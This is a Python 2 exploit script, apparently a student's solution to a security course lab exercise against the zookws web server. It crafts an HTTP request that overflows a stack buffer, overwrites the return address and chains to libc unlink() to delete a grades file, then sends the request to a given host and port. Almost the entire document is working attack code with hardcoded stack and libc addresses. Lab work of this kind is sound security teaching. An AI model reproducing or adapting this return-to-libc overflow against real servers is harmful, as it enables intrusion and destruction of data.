#!/usr/bin/env python2
import sys
import socket
import traceback
import urllib
import struct

####

# You might find it useful to define variables that store various
# stack or function addresses from the zookd / zookfs processes,
# which you can then use in build_exploit(); the following are just
# examples.

stack_buffer = 0x7fffffffdcd0
stack_retaddr = 0x7fffffffece8
accidentally_fn_addr = 0x5555555558f4
lib_c_unlink_addr = 0x2aaaab2470e0

unlink_file_path = "/home/httpd/grades.txt" + b'\00'


# This is the function that you should modify to construct an
# HTTP request that will cause a buffer overflow in some part
# of the zookws web server and exploit it.


def build_exploit(shellcode):
    # Things that you might find useful in constructing your exploit:
    ##
    # urllib.quote(s)
    # returns string s with "special" characters percent-encoded
    ##   struct.pack("<Q", x)
    # returns the 8-byte binary encoding of the 64-bit integer x
    """
    Solution for Exercise 2
    """
    payload = unlink_file_path + \
        'a' * (4095 - len(unlink_file_path)) + 'b' * 24 # the 4095 is because of the slash that is to account for slash required

    accidentally_addr_processed = struct.pack("<Q", accidentally_fn_addr)
    payload += accidentally_addr_processed

    # add another 8 byte padding as mentioned to load into rdi,
    # payload += 'c' * 8

    # proceed to add lib-c address to the addr just after rip so that when pop happens, sp points here, and goes into lib-c. There is now no need for padding
    lib_c_unlink_addr_processed = struct.pack("<Q", lib_c_unlink_addr)
    payload += lib_c_unlink_addr_processed

    # make that rb %0x10 point to stackbuffer[1]
    payload += struct.pack("<Q", stack_buffer+1)

    # Nabei this took me few hours to realise
    payload = urllib.quote(payload)

    req = "GET /{0} HTTP/1.0\r\n".format(payload) + \
        "\r\n"
    return req

####


def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####


if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())